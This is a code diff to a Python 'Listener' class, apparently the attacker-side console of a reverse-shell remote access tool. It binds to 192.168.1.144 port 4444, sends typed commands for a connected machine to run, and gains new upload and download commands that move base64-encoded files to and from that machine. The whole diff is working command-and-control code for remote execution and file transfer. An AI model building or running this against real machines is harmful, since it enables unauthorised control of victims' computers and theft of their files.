@@ -1,4 +1,4 @@
-import socket, json, simplejson, sys
+import socket, json, simplejson, sys, base64
 import re
 import zlib
 import linecache
@@ -37,7 +37,7 @@ class Listener:
 				json_data = json_data + self.connection.recv(1024)
 				decoded_json = json_data.decode()
 				return json.loads(decoded_json) #unwrap json data
-			except ValueError:
+			except:
 				self.PrintException()
 				continue
 
@@ -48,12 +48,34 @@ class Listener:
 			exit()
 		return self.reliable_receive()
 
+	def write_file(self, path, content):
+		with open(path, "wb") as file:
+			file.write(base64.b64decode(content))
+			return "[+] Download successful"
+
+	def read_file(self, path):
+		with open(path, "rb") as file:
+			return base64.b64encode(file.read())
+
 	def run(self):
 		while True:
 			command = raw_input(">> ") # NB just input for Python 3
 			command = command.split(" ")
-			result = self.execute_remotely(command) 
-			print(result) 
+			try:
+				if command[0] == "upload":
+					file_content = self.read_file(command[1])
+					command.append(file_content) # adds content as third element
+					print("Command list: ", command)
+				result = self.execute_remotely(command)
+
+				if command[0] == "download" and "[-] An error" not in result:
+
+					result = self.write_file(command[1], result)
+
+				print result
+			except Exception:
+				print("[-] An error occured during execution on the listener")
+				self.PrintException()
 
 my_listener = Listener("192.168.1.144", 4444) 
 my_listener.run()
